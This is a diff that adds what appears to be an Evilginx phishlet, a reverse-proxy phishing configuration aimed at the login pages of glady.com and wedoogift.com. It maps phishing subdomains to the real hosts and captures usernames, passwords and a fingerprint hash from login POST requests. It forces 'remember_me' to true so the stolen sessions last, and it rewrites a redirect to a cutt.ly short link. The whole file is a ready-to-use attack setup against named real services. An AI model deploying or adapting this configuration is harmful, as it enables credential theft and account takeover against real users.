@@ -1,0 +1,36 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'app', orig_sub: 'app', domain: 'glady.com', session: true, auto_filter: true}
+  - {phish_sub: 'doo', orig_sub: 'app', domain: 'wedoogift.com', session: true, auto_filter: true}
+  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'glady.com', session: true, auto_filter: true}
+  - {phish_sub: 'authentication-api.prod.onep', orig_sub: 'authentication-api.prod.onep', domain: 'wedoogift.com', session: true}
+  - {phish_sub: 'hyper-sentry.prod.onep', orig_sub: 'hyper-sentry.prod.onep', domain: 'wedoogift.com'}
+sub_filters:
+  - {triggers_on: 'authentication-api.prod.onep.wedoogift.com', orig_sub: 'authentication-api.prod.onep', domain: 'wedoogift.com', search: 'see_other":"', replace: 'see_other": "https://cutt.ly/zXD9W1o?', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens: []
+auth_urls:
+  - '/protocol/openid-connect/token'
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    key: 'fingerprint_hash'
+    search: '(.*)'
+    type: 'post'
+force_post:
+  - path: '/protocol/openid-connect/token'
+    search:
+      - {key: 'username', search: '.*'}
+      - {key: 'password', search: '.*'}
+    force:
+      - {key: 'remember_me', value: 'true'}
+    type: 'post'
+login:
+  domain: 'app.glady.com'
+  path: '/signin'
